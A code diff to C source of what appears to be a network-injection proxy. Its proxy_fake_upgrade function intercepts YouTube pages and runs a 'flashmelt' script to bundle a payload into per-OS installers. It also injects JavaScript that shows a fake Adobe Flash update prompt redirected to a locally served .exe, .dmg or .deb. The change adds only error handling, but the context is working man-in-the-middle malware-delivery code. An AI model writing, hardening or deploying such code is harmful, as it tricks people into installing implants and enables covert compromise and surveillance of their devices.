@@ -57,7 +57,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
    BIO *fbio = NULL;
    char http_header[HTTP_HEADER_LEN];
    char ipa_url[MAX_URL];
-
+   int ret = 0;
 
    if(strstr(host, "youtube"))
    {
@@ -109,32 +109,40 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 	 switch (os) {
 	 case WINDOWS:
 	     DEBUG_MSG(D_INFO, "Windows detected, melting...");
-	     asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py windows %s", file);
+	     ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py windows %s", file);
 	     break;
 
 	  case OSX:
              DEBUG_MSG(D_INFO, "OS X detected, melting...");
-	     asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py osx %s", file);
+	     ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py osx %s", file);
              break;
 
 	 case LINUX:
 	     DEBUG_MSG(D_INFO, "Linux detected, melting...");
-	     asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py linux %s", file);
+	     ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py linux %s", file);
 	     break;
 
 	 case UNKNOWN:
 	     break;
 	 }
 
+	 if (ret == -1)
+            DEBUG_MSG(D_ERROR, "Melting allocation failed");
+
 	 ON_ERROR(cmd_melt, NULL, "virtual memory exhausted");
-         system(cmd_melt);
+
+         ret = system(cmd_melt);
+
+	 if (ret == -1 || ret == 127)
+            DEBUG_MSG(D_ERROR, "Melting failed");
+
          free(cmd_melt);
 
          DEBUG_MSG(D_INFO, "Substituting video frame...");
       
          char *html_to_inject = NULL;
 
-         asprintf(&html_to_inject, 
+         ret = asprintf(&html_to_inject, 
 		"\n" \
 		"        var adobelocalmirror = '/%s%s';\n" \
 		"        var c = document.createElement('link');\n" \
@@ -146,6 +154,9 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 		"        if(!msg) var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
 		"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\"><div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', adobelocalmirror).trim() + '</div></div></div>';\n", 
 		file, os == WINDOWS ? ".exe" : os == OSX ? ".dmg" : ".deb");
+
+	 if (ret == -1)
+            DEBUG_MSG(D_ERROR, "Injection allocation failed");
 
 	 ON_ERROR(html_to_inject, NULL, "virtual memory exhausted");
 
